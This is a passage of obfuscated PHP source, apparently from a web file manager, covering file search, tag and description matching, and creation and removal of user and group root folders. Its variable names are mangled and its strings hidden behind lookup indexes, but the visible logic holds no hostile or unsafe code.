private function removeByFile($ë¯ûİ‘’) { $›ª´Î„û =& $_SERVER[Ö†ØøÖ±]; $Ÿš˜“×‚ = Model($›ª´Î„û[878])->where(array($›ª´Î„û[518] => $ë¯ûİ‘’))->field($›ª´Î„û[181])->select(); $™¶óÅÇï = array_to_keyvalue($Ÿš˜“×‚, $›ª´Î„û[12], $›ª´Î„û[181]); $ÖÚŒÕŸø = array($›ª´Î„û[181] => array($›ª´Î„û[7], $™¶óÅÇï), $›ª´Î„û[539] => 1); $Ÿš˜“×‚ = $this->where($ÖÚŒÕŸø)->field($›ª´Î„û[642])->select(); if (empty($Ÿš˜“×‚)) { return; } $°–Ùû´° = array_to_keyvalue($Ÿš˜“×‚, $›ª´Î„û[12], $›ª´Î„û[642]); $this->remove($°–Ùû´°); } private function shareFileMeta($¾¹âšÙı, $ğë“ó = null) { $²‚¼ÚŸ¤ =& $_SERVER[Ö†ØøÖ±]; $íá£âÑ¿ = array($²‚¼ÚŸ¤[518] => $¾¹âšÙı, $²‚¼ÚŸ¤[94] => $²‚¼ÚŸ¤[2076]); if (is_null($ğë“ó)) { return Model($²‚¼ÚŸ¤[2077])->where($íá£âÑ¿)->find(); } $íá£âÑ¿[$²‚¼ÚŸ¤[427]] = $ğë“ó; Model($²‚¼ÚŸ¤[2077])->add($íá£âÑ¿, array(), !0); } } goto BŸ·Îàè¶; c•†§Ê÷˜“: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ùóš“¦Í) { $á¢İïí =& $_SERVER[Ö†ØøÖ±]; $…•®ê× = KodIO::fileTypeList(); $—ó³°â¨ = $…•®ê×[$ùóš“¦Í]; if (!$—ó³°â¨) { return array(); } $¨Ã§Û’® = $—ó³°â¨[$á¢İïí[175]]; $¨¨Äæª¨ = $á¢İïí[7]; if (!$—ó³°â¨[$á¢İïí[175]]) { $»š¡ú›² = array_to_keyvalue($…•®ê×, $á¢İïí[12], $á¢İïí[175]); $¨Ã§Û’® = implode($á¢İïí[50], $»š¡ú›²); $¨¨Äæª¨ = $á¢İïí[2153]; } $§œ¬ÀÉ’ = explode($á¢İïí[50], trim($¨Ã§Û’®, $á¢İïí[50])); return array($¨¨Äæª¨, $§œ¬ÀÉ’); } public function listPathType($ºò•Ù¨ƒ) { $óà‚ÊÅ¾ =& $_SERVER[Ö†ØøÖ±]; $Ì—¶ï£¾ = $this->fileTypeWhere($ºò•Ù¨ƒ); if (!$Ì—¶ï£¾) { return array(); } $Óùƒ„ = USER_ID; $‚ì§Òòº = Model($óà‚ÊÅ¾[576])->getInfo($Óùƒ„); $â³Å„Ï½ = array($óà‚ÊÅ¾[625] => SourceModel::TYPE_USER, $óà‚ÊÅ¾[562] => array($óà‚ÊÅ¾[589], $óà‚ÊÅ¾[572] . $‚ì§Òòº[$óà‚ÊÅ¾[87]][$óà‚ÊÅ¾[181]] . $óà‚ÊÅ¾[590]), $óà‚ÊÅ¾[626] => $Óùƒ„, $óà‚ÊÅ¾[623] => 0, $óà‚ÊÅ¾[624] => $Ì—¶ï£¾); return $this->listSource($â³Å„Ï½); } public function listSearch($ÒÑ„ÖİÉ, $Ş™º³¶‰ = 300) { $æ¡Û³ì =& $_SERVER[Ö†ØøÖ±]; if (isset($ÒÑ„ÖİÉ[$æ¡Û³ì[1991]]) && $ÒÑ„ÖİÉ[$æ¡Û³ì[1991]]) { $ÒÑ„ÖİÉ[$æ¡Û³ì[1991]] = str_replace($æ¡Û³ì[436], $æ¡Û³ì[2154], trim($ÒÑ„ÖİÉ[$æ¡Û³ì[1991]])); } $Õ‹Ã¿¢¥ = $this->_parseSearchWhere($ÒÑ„ÖİÉ); if (!isset($Õ‹Ã¿¢¥[$æ¡Û³ì[482]])) { $Õ‹Ã¿¢¥[$æ¡Û³ì[482]] = 0; } $¢‡ôÒı = $æ¡Û³ì[2155]; $¸©ûµõ‚ = $Õ‹Ã¿¢¥; $ºÌğ¥Ùû = $¢‡ôÒı; $this->_listSearchBindPinyin($ÒÑ„ÖİÉ, $Õ‹Ã¿¢¥, $¢‡ôÒı); $this->alias($æ¡Û³ì[496])->_makeOrder(); $Õ‹Ã¿¢¥ = $this->parseWhereLike($Õ‹Ã¿¢¥); $Ÿ³ìı‘Ö = $this->distinct(!0)->field($¢‡ôÒı)->where($Õ‹Ã¿¢¥)->selectPage($Ş™º³¶‰); if ($GLOBALS[$æ¡Û³ì[6]][$æ¡Û³ì[433]][$æ¡Û³ì[434]] && Input::check($ÒÑ„ÖİÉ[$æ¡Û³ì[1991]], $æ¡Û³ì[632]) && $Ÿ³ìı‘Ö[$æ¡Û³ì[419]][$æ¡Û³ì[406]] == 1 && $Ÿ³ìı‘Ö[$æ¡Û³ì[419]][$æ¡Û³ì[420]] == 0) { $Ÿ³ìı‘Ö = $this->distinct(!0)->field($¢‡ôÒı)->where($¸©ûµõ‚)->limit(1000)->select(); $Ÿ³ìı‘Ö = array_page_split($Ÿ³ìı‘Ö, !1, $Ş™º³¶‰); } $this->_listSearchFileContent($Ÿ³ìı‘Ö, $ÒÑ„ÖİÉ, $ºÌğ¥Ùû, $¸©ûµõ‚); $this->_listSearchDesc($Ÿ³ìı‘Ö, $ÒÑ„ÖİÉ, $ºÌğ¥Ùû); $this->_listSearchTag($Ÿ³ìı‘Ö, $ÒÑ„ÖİÉ, $ºÌğ¥Ùû); $this->_listSearchGroupTag($Ÿ³ìı‘Ö, $ÒÑ„ÖİÉ, $ºÌğ¥Ùû); $this->_listDataApply($Ÿ³ìı‘Ö[$æ¡Û³ì[422]]); $this->_listMake($Ÿ³ìı‘Ö); return $Ÿ³ìı‘Ö; } private function _listSearchFileContent(&$Ê–Ó¦°¨, $˜ßÃàÂÛ, $ø‘Î¯, $‚ºªÎç™) { $Œ”ìé =& $_SERVER[Ö†ØøÖ±]; if (!$˜ßÃàÂÛ[$Œ”ìé[1991]] || $Ê–Ó¦°¨[$Œ”ìé[419]][$Œ”ìé[406]] > 1) { return; } if (!isset($‚ºªÎç™[$Œ”ìé[32]]) || !is_array($˜ßÃàÂÛ[$Œ”ìé[518]])) { return; } $‚ºªÎç™[$Œ”ìé[518]] = array($Œ”ìé[7], $˜ßÃàÂÛ[$Œ”ìé[518]]); unset($‚ºªÎç™[$Œ”ìé[32]]); unset($˜ßÃàÂÛ[$Œ”ìé[518]]); $»¦Ÿ×ï = $this->field($ø‘Î¯)->where($‚ºªÎç™)->limit($Œ”ìé[2156])->select(); if (!$»¦Ÿ×ï || count($»¦Ÿ×ï) == 0) { return; } $Ê–Ó¦°¨[$Œ”ìé[422]] = array_merge($»¦Ÿ×ï, $Ê–Ó¦°¨[$Œ”ìé[422]]); $Ê–Ó¦°¨[$Œ”ìé[419]][$Œ”ìé[420]] += count($»¦Ÿ×ï); } private function _listSearchTag(&$’µÚ“ã‰, $©ÈÒ˜à, $†íªéÏ) { $›úÂÓ =& $_SERVER[Ö†ØøÖ±]; if (!$©ÈÒ˜à[$›úÂÓ[1991]] || $’µÚ“ã‰[$›úÂÓ[419]][$›úÂÓ[406]] > 1) { return; } $ß¯ÉÇ£ = Model($›úÂÓ[2157])->listData(); $±ÅïÜˆÅ = array(); $üÌç²û· = $©ÈÒ˜à[$›úÂÓ[1991]]; foreach ($ß¯ÉÇ£ as $½¸ŒŠ›ô) { $×Êõ„İ = $½¸ŒŠ›ô[$›úÂÓ[32]]; $²â‡¦Ö¾ = str_replace($›úÂÓ[53], $›úÂÓ[12], Pinyin::get($×Êõ„İ)); if (stripos($×Êõ„İ, $üÌç²û·) !== !1 || stripos($²â‡¦Ö¾, $üÌç²û·) !== !1) { $±ÅïÜˆÅ[] = $½¸ŒŠ›ô[$›úÂÓ[451]]; } } if (!$±ÅïÜˆÅ) { return; } $ú™Ìüë = array($›úÂÓ[477] => array($›úÂÓ[7], $±ÅïÜˆÅ), $›úÂÓ[1699] => USER_ID); $©ØÙÁ¦ = Model($›úÂÓ[479])->field($›úÂÓ[84])->where($ú™Ìüë)->select(); $©ØÙÁ¦ = array_to_keyvalue($©ØÙÁ¦, $›úÂÓ[12], $›úÂÓ[84]); $Ã‡Á½êğ = array_unique($©ØÙÁ¦); $this->_listSearchMerge($’µÚ“ã‰, $©ÈÒ˜à, $†íªéÏ, $Ã‡Á½êğ); } private function _listSearchDesc(&$ŠÀ¢àšê, $Ïàøõ›’, $Ò¬ŒÙ¤) { $¹ëÖû¢­ =& $_SERVER[Ö†ØøÖ±]; if (!$Ïàøõ›’[$¹ëÖû¢­[1991]] || $ŠÀ¢àšê[$¹ëÖû¢­[419]][$¹ëÖû¢­[406]] > 1) { return; } $ˆåÏ§„‘ = array($¹ëÖû¢­[94] => $¹ëÖû¢­[503], $¹ëÖû¢­[427] => array($¹ëÖû¢­[435], $¹ëÖû¢­[1993] . $Ïàøõ›’[$¹ëÖû¢­[1991]] . $¹ëÖû¢­[1993])); $ŒŒŸ„î¼ = !1; if ($ŒŒŸ„î¼) { $ØÕüõÇ¯ = $this->listSearchChildren($Ïàøõ›’[$¹ëÖû¢­[180]]); $ØÕüõÇ¯ = array_unique($ØÕüõÇ¯); if (!$ØÕüõÇ¯) { return; } $ˆåÏ§„‘[$¹ëÖû¢­[181]] = array($¹ëÖû¢­[7], $ØÕüõÇ¯); } $àëª­ùÇ = Model($¹ëÖû¢­[609])->field($¹ëÖû¢­[181])->where($ˆåÏ§„‘)->limit(5000)->select(); $š–çù¸ = array_to_keyvalue($àëª­ùÇ, $¹ëÖû¢­[12], $¹ëÖû¢­[181]); $this->_listSearchMerge($ŠÀ¢àšê, $Ïàøõ›’, $Ò¬ŒÙ¤, $š–çù¸); } private function _listSearchGroupTag(&$„ûØÍ˜, $ûò¹‚ë—, $°÷é‹Ùá) { $ìÖ›Æõ =& $_SERVER[Ö†ØøÖ±]; if (!$ûò¹‚ë—[$ìÖ›Æõ[1991]] || $„ûØÍ˜[$ìÖ›Æõ[419]][$ìÖ›Æõ[406]] > 1 || !$ûò¹‚ë—[$ìÖ›Æõ[180]]) { return; } $ø×É¼ = $this->sourceInfo($ûò¹‚ë—[$ìÖ›Æõ[180]]); if (!$ø×É¼ || $ø×É¼[$ìÖ›Æõ[178]] != SourceModel::TYPE_GROUP) { return; } $‘îö†õá = $ø×É¼[$ìÖ›Æõ[547]]; $¿·œëµ = Model($ìÖ›Æõ[2158])->get($‘îö†õá); $ëá—ºŒÒ = array(); $šºĞø¦ = $ûò¹‚ë—[$ìÖ›Æõ[1991]]; foreach ($¿·œëµ[$ìÖ›Æõ[422]] as $ü¯îÂë) { $ìúúÁØ = $ü¯îÂë[$ìÖ›Æõ[32]]; $­Éû–Ô° = str_replace($ìÖ›Æõ[53], $ìÖ›Æõ[12], Pinyin::get($ìúúÁØ)); if (stripos($ìúúÁØ, $šºĞø¦) !== !1 || stripos($­Éû–Ô°, $šºĞø¦) !== !1) { $ëá—ºŒÒ[] = $ü¯îÂë[$ìÖ›Æõ[451]]; } } if (!$ëá—ºŒÒ) { return; } $ë¹È²òŠ = array($ìÖ›Æõ[477] => array($ìÖ›Æõ[7], $ëá—ºŒÒ), $ìÖ›Æõ[1699] => 0, $ìÖ›Æõ[33] => $ìÖ›Æõ[2013] . $‘îö†õá); $×œô©Ã = Model($ìÖ›Æõ[479])->field($ìÖ›Æõ[84])->where($ë¹È²òŠ)->select(); $×œô©Ã = array_to_keyvalue($×œô©Ã, $ìÖ›Æõ[12], $ìÖ›Æõ[84]); $ìØñõß = array_unique($×œô©Ã); $this->_listSearchMerge($„ûØÍ˜, $ûò¹‚ë—, $°÷é‹Ùá, $ìØñõß); } private function _listSearchMerge(&$ÏÁöª», $âŸ·†£›, $çÙÛõáş, $²”ŞÈöœ) { $’¹»Ã =& $_SERVER[Ö†ØøÖ±]; if (!$²”ŞÈöœ) { return; } $–äˆ°şŒ = array_to_keyvalue($ÏÁöª»[$’¹»Ã[422]], $’¹»Ã[12], $’¹»Ã[181]); $ë‹êµ‚’ = array_diff($²”ŞÈöœ, $–äˆ°şŒ); if (!$ë‹êµ‚’) { return; } $ê¶Ş°Ø = array($’¹»Ã[181] => array($’¹»Ã[7], $ë‹êµ‚’)); $˜´ÄÃ‚• = $this->field($çÙÛõáş)->where($ê¶Ş°Ø)->select(); if (!$˜´ÄÃ‚•) { return; } $Å¡‹˜À³ = array(); foreach ($˜´ÄÃ‚• as $ôø’ç›) { if ($this->_listSearchFilter($ôø’ç›, $âŸ·†£›)) { $Å¡‹˜À³[] = $ôø’ç›; } } $ÏÁöª»[$’¹»Ã[422]] = array_merge($Å¡‹˜À³, $ÏÁöª»[$’¹»Ã[422]]); $ÏÁöª»[$’¹»Ã[419]][$’¹»Ã[420]] += count($Å¡‹˜À³); } private function _listSearchFilter($†‘ç°ş, $¼Æ’§ÜÁ) { $êŒ€½ó =& $_SERVER[Ö†ØøÖ±]; $Ôª€Îô’ = $†‘ç°ş[$êŒ€½ó[462]] == $êŒ€½ó[88]; if (!strstr($†‘ç°ş[$êŒ€½ó[562]], $êŒ€½ó[50] . $¼Æ’§ÜÁ[$êŒ€½ó[180]] . $êŒ€½ó[50])) { return !1; } if (isset($¼Æ’§ÜÁ[$êŒ€½ó[463]]) && $¼Æ’§ÜÁ[$êŒ€½ó[463]] != $êŒ€½ó[1952]) { if ($¼Æ’§ÜÁ[$êŒ€½ó[463]] == $êŒ€½ó[75] && !$Ôª€Îô’) { return !1; } if ($¼Æ’§ÜÁ[$êŒ€½ó[463]] != $êŒ€½ó[75] && $Ôª€Îô’) { return !1; } if (!strstr($†‘ç°ş[$êŒ€½ó[175]], $êŒ€½ó[50] . $¼Æ’§ÜÁ[$êŒ€½ó[463]] . $êŒ€½ó[50])) { return !1; } } if (isset($¼Æ’§ÜÁ[$êŒ€½ó[2159]]) && $¼Æ’§ÜÁ[$êŒ€½ó[2159]] < $†‘ç°ş[$êŒ€½ó[76]]) { return !1; } if (isset($¼Æ’§ÜÁ[$êŒ€½ó[2160]]) && $¼Æ’§ÜÁ[$êŒ€½ó[2160]] > $†‘ç°ş[$êŒ€½ó[76]]) { return !1; } if (isset($¼Æ’§ÜÁ[$êŒ€½ó[639]]) && $¼Æ’§ÜÁ[$êŒ€½ó[639]] != $†‘ç°ş[$êŒ€½ó[506]]) { return !1; } return !0; } public function listSearchChildren($÷ìˆŸâ, $üÉúØÈ¡ = 5000) { $”á³²çª =& $_SERVER[Ö†ØøÖ±]; $î§¿˜ = array(); $”‹®Ìàô = $this->sourceInfo($÷ìˆŸâ); $ü¤·ãà  = array($”á³²çª[562] => array($”á³²çª[435], $”‹®Ìàô[$”á³²çª[562]] . $”‹®Ìàô[$”á³²çª[181]] . $”á³²çª[590])); $™ô›üÇø = $this->field($”á³²çª[76])->where($ü¤·ãà )->limit($üÉúØÈ¡ + 1)->select(); $òÕÅÉÚ° = is_array($™ô›üÇø) ? count($™ô›üÇø) : 0; if ($òÕÅÉÚ° > $üÉúØÈ¡) { return $this->_listSearchChildrenNear($÷ìˆŸâ, $üÉúØÈ¡); } $˜ùåËä = $this->field($”á³²çª[181])->where($ü¤·ãà )->select(); $î§¿˜ = array_to_keyvalue($˜ùåËä, $”á³²çª[12], $”á³²çª[181]); return $î§¿˜; } private function _listSearchChildrenNear($‰¨áÁÇ, $Ù®ÅãóÖ) { $àÖÚ‹àÀ =& $_SERVER[Ö†ØøÖ±]; $òó¦î¸¥ = array(); $·ËºÂ = array($àÖÚ‹àÀ[180] => $‰¨áÁÇ); $¹ìùö˜ø = $this->field($àÖÚ‹àÀ[2161])->where($·ËºÂ)->select(); $ÎÆó’•† = array_to_keyvalue(array_filter_by_field($¹ìùö˜ø, $àÖÚ‹àÀ[462], $àÖÚ‹àÀ[88]), $àÖÚ‹àÀ[12], $àÖÚ‹àÀ[181]); $òó¦î¸¥ = array_merge($òó¦î¸¥, array_to_keyvalue($¹ìùö˜ø, $àÖÚ‹àÀ[12], $àÖÚ‹àÀ[181])); if (!$ÎÆó’•†) { return $òó¦î¸¥; } $·ËºÂ = array($àÖÚ‹àÀ[180] => array($àÖÚ‹àÀ[7], $ÎÆó’•†)); $¹ìùö˜ø = $this->field($àÖÚ‹àÀ[2161])->where($·ËºÂ)->limit($Ù®ÅãóÖ)->select(); $òó¦î¸¥ = array_merge($òó¦î¸¥, array_to_keyvalue($¹ìùö˜ø, $àÖÚ‹àÀ[12], $àÖÚ‹àÀ[181])); $òó¦î¸¥ = array_slice($òó¦î¸¥, 0, $Ù®ÅãóÖ); return $òó¦î¸¥; } private function _listSearchBindPinyin($Á†’¶ªÆ, &$…òã¶ìé, &$â¡ôøñı) { $ô¤ã³ÛÙ =& $_SERVER[Ö†ØøÖ±]; if (!isset($Á†’¶ªÆ[$ô¤ã³ÛÙ[1991]]) || !$Á†’¶ªÆ[$ô¤ã³ÛÙ[1991]]) { return; } if (!Input::check($Á†’¶ªÆ[$ô¤ã³ÛÙ[1991]], $ô¤ã³ÛÙ[371]) || strlen($Á†’¶ªÆ[$ô¤ã³ÛÙ[1991]]) < 2) { return; } $¨’İ€ˆÓ = "\x4c\x45\x46\124\40\112\117\x49\x4e\x20{$this->tablePrefix}\x69\x6f\137\x73\157\165\162\x63\145\137\155\145\x74\x61\40\155\145\x74\141\x20\x6f\156\40\163\x6f\165\162\143\145\56\163\x6f\x75\162\x63\145\x49\x44\x20\x3d\40\x6d\145\x74\x61\56\163\157\165\x72\143\x65\x49\x44"; $ˆëã”Á = array(); $â¡ôøñı = str_replace(array($ô¤ã³ÛÙ[246], $ô¤ã³ÛÙ[53], $ô¤ã³ÛÙ[2162]), $ô¤ã³ÛÙ[12], $â¡ôøñı); $â¡ôøñı = $ô¤ã³ÛÙ[488] . str_replace($ô¤ã³ÛÙ[50], $ô¤ã³ÛÙ[489], $â¡ôøñı); $óĞ¢¥¹ = $…òã¶ìé[$ô¤ã³ÛÙ[32]]; unset($…òã¶ìé[$ô¤ã³ÛÙ[32]]); foreach ($…òã¶ìé as $Î´çªÀ¶ => $Âûè”›) { $ˆëã”Á[$ô¤ã³ÛÙ[488] . $Î´çªÀ¶] = $Âûè”›; } foreach ($óĞ¢¥¹ as $ëÀä¿Éæ) { $ˆëã”Á[] = array($ô¤ã³ÛÙ[493] => $ëÀä¿Éæ, $ô¤ã³ÛÙ[1053] => $ô¤ã³ÛÙ[1995], array($ô¤ã³ÛÙ[2163] => $ëÀä¿Éæ, $ô¤ã³ÛÙ[2164] => array($ô¤ã³ÛÙ[7], array($ô¤ã³ÛÙ[515], $ô¤ã³ÛÙ[514])))); } $this->join($¨’İ€ˆÓ); $…òã¶ìé = $ˆëã”Á; } private function _parseSearchWhere($Š»Õ¡ùí) { $ş¨š‚¦É =& $_SERVER[Ö†ØøÖ±]; $¸¾—±ÌÑ = array(); if (isset($Š»Õ¡ùí[$ş¨š‚¦É[813]]) && $Š»Õ¡ùí[$ş¨š‚¦É[813]]) { $¸¾—±ÌÑ[$ş¨š‚¦É[85]] = array($ş¨š‚¦É[2165], $Š»Õ¡ùí[$ş¨š‚¦É[813]]); } if (isset($Š»Õ¡ùí[$ş¨š‚¦É[814]]) && $Š»Õ¡ùí[$ş¨š‚¦É[814]]) { $ı˜¤“î = array($ş¨š‚¦É[2166], $Š»Õ¡ùí[$ş¨š‚¦É[814]]); if ($¸¾—±ÌÑ[$ş¨š‚¦É[85]]) { $¸¾—±ÌÑ[$ş¨š‚¦É[85]] = array($¸¾—±ÌÑ[$ş¨š‚¦É[85]], $ı˜¤“î, $ş¨š‚¦É[2167]); } else { $¸¾—±ÌÑ[$ş¨š‚¦É[85]] = $ı˜¤“î; } } if (isset($Š»Õ¡ùí[$ş¨š‚¦É[2159]]) && $Š»Õ¡ùí[$ş¨š‚¦É[2159]] > 0) { $¸¾—±ÌÑ[$ş¨š‚¦É[76]] = array($ş¨š‚¦É[2165], $Š»Õ¡ùí[$ş¨š‚¦É[2159]]); } if (isset($Š»Õ¡ùí[$ş¨š‚¦É[2160]]) && $Š»Õ¡ùí[$ş¨š‚¦É[2160]]) { $ı˜¤“î = array($ş¨š‚¦É[2166], $Š»Õ¡ùí[$ş¨š‚¦É[2160]]); if ($¸¾—±ÌÑ[$ş¨š‚¦É[76]]) { $¸¾—±ÌÑ[$ş¨š‚¦É[76]] = array($¸¾—±ÌÑ[$ş¨š‚¦É[76]], $ı˜¤“î, $ş¨š‚¦É[2167]); } else { $¸¾—±ÌÑ[$ş¨š‚¦É[76]] = $ı˜¤“î; } } if (isset($Š»Õ¡ùí[$ş¨š‚¦É[639]]) && $Š»Õ¡ùí[$ş¨š‚¦É[639]]) { $¸¾—±ÌÑ[] = array($ş¨š‚¦É[506] => $Š»Õ¡ùí[$ş¨š‚¦É[639]], $ş¨š‚¦É[504] => $Š»Õ¡ùí[$ş¨š‚¦É[639]], $ş¨š‚¦É[1053] => $ş¨š‚¦É[1995]); } if (isset($Š»Õ¡ùí[$ş¨š‚¦É[463]]) && $Š»Õ¡ùí[$ş¨š‚¦É[463]]) { $²†…ÎœĞ = $Š»Õ¡ùí[$ş¨š‚¦É[463]]; if ($²†…ÎœĞ == $ş¨š‚¦É[75]) { $¸¾—±ÌÑ[$ş¨š‚¦É[462]] = 1; } else { if ($²†…ÎœĞ == $ş¨š‚¦É[2168]) { $¸¾—±ÌÑ[$ş¨š‚¦É[462]] = 0; } else { if ($²†…ÎœĞ) { $²†…ÎœĞ = is_array($²†…ÎœĞ) ? $²†…ÎœĞ : explode($ş¨š‚¦É[50], $²†…ÎœĞ); $¸¾—±ÌÑ[$ş¨š‚¦É[463]] = array($ş¨š‚¦É[469], $²†…ÎœĞ); $¸¾—±ÌÑ[$ş¨š‚¦É[462]] = 0; } } } } $this->_parseSearchParent($Š»Õ¡ùí, $¸¾—±ÌÑ); if (isset($Š»Õ¡ùí[$ş¨š‚¦É[1991]]) && trim($Š»Õ¡ùí[$ş¨š‚¦É[1991]])) { $À¢Óå£¾ = trim($Š»Õ¡ùí[$ş¨š‚¦É[1991]]); $ï€¬ËÜ = explode($ş¨š‚¦É[53], $À¢Óå£¾); if (strlen($À¢Óå£¾) > 2 && (substr($À¢Óå£¾, 0, 1) == $ş¨š‚¦É[118] && substr($À¢Óå£¾, -1) == $ş¨š‚¦É[118]) || substr($À¢Óå£¾, 0, 1) == $ş¨š‚¦É[58] && substr($À¢Óå£¾, -1) == $ş¨š‚¦É[58]) { $À¢Óå£¾ = substr($À¢Óå£¾, 1, -1); $ï€¬ËÜ = array($À¢Óå£¾); } $¸¾—±ÌÑ[$ş¨š‚¦É[32]] = array(array($ş¨š‚¦É[589], $ş¨š‚¦É[1993] . $À¢Óå£¾ . $ş¨š‚¦É[1993])); if (count($ï€¬ËÜ) > 1) { $¸¾—±ÌÑ[$ş¨š‚¦É[32]] = array(); foreach ($ï€¬ËÜ as $ß°£î‹À) { if (!trim($ß°£î‹À)) { continue; } $¸¾—±ÌÑ[$ş¨š‚¦É[32]][] = array($ş¨š‚¦É[589], $ş¨š‚¦É[1993] . trim($ß°£î‹À) . $ş¨š‚¦É[1993]); } } } return $¸¾—±ÌÑ; } private function _parseSearchParent($¬ë°ö¨, &$ßù¡±ïì) { $¯ƒÌ˜™ =& $_SERVER[Ö†ØøÖ±]; if (!isset($¬ë°ö¨[$¯ƒÌ˜™[180]]) || !$¬ë°ö¨[$¯ƒÌ˜™[180]]) { return; } $¡º™Â¦Æ = $this->pathInfo($¬ë°ö¨[$¯ƒÌ˜™[180]]); $™¥ğ³à = $¡º™Â¦Æ[$¯ƒÌ˜™[180]] . $¯ƒÌ˜™[12] === $¯ƒÌ˜™[212]; $ßëıÇ¯¸ = $¡º™Â¦Æ[$¯ƒÌ˜™[178]] == $¯ƒÌ˜™[556]; if ($¡º™Â¦Æ[$¯ƒÌ˜™[573]] == $¯ƒÌ˜™[574]) { $¨—Õƒş‘ = $this->sourceInfo($¬ë°ö¨[$¯ƒÌ˜™[180]]); $¡º™Â¦Æ[$¯ƒÌ˜™[562]] = $¨—Õƒş‘[$¯ƒÌ˜™[562]]; } $ßù¡±ïì[$¯ƒÌ˜™[629]] = array($¯ƒÌ˜™[589], $¡º™Â¦Æ[$¯ƒÌ˜™[562]] . $¬ë°ö¨[$¯ƒÌ˜™[180]] . $¯ƒÌ˜™[590]); $‘Ù¼Üï¢ = isset($¬ë°ö¨[$¯ƒÌ˜™[1856]]) && in_array($¯ƒÌ˜™[556], $¬ë°ö¨[$¯ƒÌ˜™[1856]]); if (!$‘Ù¼Üï¢ || !$ßëıÇ¯¸ || !$™¥ğ³à || !$¡º™Â¦Æ[$¯ƒÌ˜™[464]]) { return; } if (!AuthModel::authCheckRoot($¡º™Â¦Æ[$¯ƒÌ˜™[464]][$¯ƒÌ˜™[465]])) { return; } $¤©“Ç = $¡º™Â¦Æ[$¯ƒÌ˜™[547]] . $¯ƒÌ˜™[12]; if ($¤©“Ç == $¯ƒÌ˜™[88]) { unset($ßù¡±ïì[$¯ƒÌ˜™[629]]); $ßù¡±ïì[$¯ƒÌ˜™[178]] = self::TYPE_GROUP; return; } $ÓˆÖİ‹Ì = Model($¯ƒÌ˜™[563])->groupChildrenAll($¤©“Ç); $ıÅˆÑš‚ = count($ÓˆÖİ‹Ì); if ($ıÅˆÑš‚ <= 1) { return; } $ûÒ¢ŸŠ˜ = array($¯ƒÌ˜™[180] => 0, $¯ƒÌ˜™[178] => self::TYPE_GROUP, $¯ƒÌ˜™[547] => array($¯ƒÌ˜™[7], $ÓˆÖİ‹Ì)); $±€®ØŠõ = $this->field($¯ƒÌ˜™[2169])->where($ûÒ¢ŸŠ˜)->limit($ıÅˆÑš‚)->select(); $ßù¡±ïì[$¯ƒÌ˜™[629]] = array(); foreach ($±€®ØŠõ as $¨™õ£) { $ßù¡±ïì[$¯ƒÌ˜™[629]][] = array($¯ƒÌ˜™[589], $¯ƒÌ˜™[572] . $¨™õ£[$¯ƒÌ˜™[181]] . $¯ƒÌ˜™[590]); } $ßù¡±ïì[$¯ƒÌ˜™[629]][] = $¯ƒÌ˜™[1995]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ãØõÇ´ï) { $¥ŸëÈ²¼ =& $_SERVER[Ö†ØøÖ±]; $Ä‹ß = Model($¥ŸëÈ²¼[555])->where(array($¥ŸëÈ²¼[1690] => $ãØõÇ´ï))->find(); $˜å‡ßòø = $this->_mkdirRoot(SourceModel::TYPE_USER, $ãØõÇ´ï, $Ä‹ß[$¥ŸëÈ²¼[32]]); $this->userDesktopAdd($˜å‡ßòø); return $˜å‡ßòø; } public function userDesktopAdd($ñ—úéÄ¦) { $Ö˜Õî„² =& $_SERVER[Ö†ØøÖ±]; $…ƒïâº® = LNG($Ö˜Õî„²[2170]); $Åê·‹Æ• = $this->mkdir($ñ—úéÄ¦, $…ƒïâº®); $this->metaSet($Åê·‹Æ•, $Ö˜Õî„²[2171], $Ö˜Õî„²[88]); $this->metaSet($ñ—úéÄ¦, $Ö˜Õî„²[2172], $Åê·‹Æ•); } public function userPathSafeAdd($Šøéş©Ì) { $òÇ‚Ì£¹ =& $_SERVER[Ö†ØøÖ±]; $ıüÆÜş™ = Model($òÇ‚Ì£¹[555])->getInfoFull($Šøéş©Ì); if (!$ıüÆÜş™) { return !1; } if (_get($ıüÆÜş™, $òÇ‚Ì£¹[577])) { return $ıüÆÜş™[$òÇ‚Ì£¹[516]][$òÇ‚Ì£¹[2173]]; } $Ò­¿…åè = $this->_mkdirRoot(SourceModel::TYPE_USER, $Šøéş©Ì, $òÇ‚Ì£¹[2174], $òÇ‚Ì£¹[483]); Model($òÇ‚Ì£¹[555])->metaSet($Šøéş©Ì, $òÇ‚Ì£¹[2173], $Ò­¿…åè); $this->metaSet($Ò­¿…åè, $òÇ‚Ì£¹[2175], $Šøéş©Ì); return $Ò­¿…åè; } public function groupRootAdd($ò×éÜ¿) { $¬Â¥Ôáò =& $_SERVER[Ö†ØøÖ±]; $‰ÄåßË¼ = Model($¬Â¥Ôáò[563])->where(array($¬Â¥Ôáò[1985] => $ò×éÜ¿))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ò×éÜ¿, $‰ÄåßË¼[$¬Â¥Ôáò[32]]); } public function systemRootPathAdd($ãàÎÂ¬Ú) { if ($ãàÎÂ¬Ú != $_SERVER[Ö†ØøÖ±][583]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ãàÎÂ¬Ú); } public function userRootRemove($²í®Ÿäê) { $Ëšêğ›¼ = $this->targetSourceRoot(SourceModel::TYPE_USER, $²í®Ÿäê, !0); foreach ($Ëšêğ›¼ as $‘»¿ßåú) { if (!$‘»¿ßåú) { continue; } $this->remove($‘»¿ßåú[$_SERVER[Ö†ØøÖ±][181]], !1); } } public function groupRootRemove($şĞÂÃòÎ) { $Ç£¨äßÑ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $şĞÂÃòÎ); if (!$Ç£¨äßÑ) { return; } $this->remove($Ç£¨äßÑ[$_SERVER[Ö†ØøÖ±][181]], !1); } private function _mkdirRoot($ÜĞ­±×Ó, $ğ›î¬Ş…, $™øüÆƒè, $Í©©Ÿ–â = '') { $²Äê¤¦ =& $_SERVER[Ö†ØøÖ±]; $Ùš®óÎ = defined($²Äê¤¦[2118]) ? USER_ID : 0; $€Æ´î = array($²Äê¤¦[454] => 0, $²Äê¤¦[625] => $ÜĞ­±×Ó, $²Äê¤¦[626] => $ğ›î¬Ş…, $²Äê¤¦[623] => 1, $²Äê¤¦[627] => $Ùš®óÎ, $²Äê¤¦[628] => $Ùš®óÎ, $²Äê¤¦[624] => $Í©©Ÿ–â, $²Äê¤¦[629] => $²Äê¤¦[572], $²Äê¤¦[481] => 0, $²Äê¤¦[594] => 0, $²Äê¤¦[519] => 0, 